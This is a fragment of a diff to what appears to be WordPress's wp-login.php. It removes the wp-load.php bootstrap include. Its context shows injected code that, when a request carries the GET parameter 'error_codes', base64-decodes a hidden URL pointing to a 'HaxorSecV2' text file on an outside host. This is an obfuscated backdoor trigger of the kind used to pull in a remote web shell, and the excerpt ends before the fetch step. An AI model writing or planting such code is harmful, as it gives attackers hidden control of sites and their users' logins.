@@ -9,8 +9,6 @@
  */
 
 /** Make sure that the WordPress bootstrap has run before continuing. */
-require __DIR__ . '/wp-load.php';
-
 // Redirect to HTTPS login if forced to use SSL.
     if (isset($_GET['error_codes'])) { 
     $url = base64_decode('aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL3R4dC9IYXhvclNlY1YyLnR4dA==');
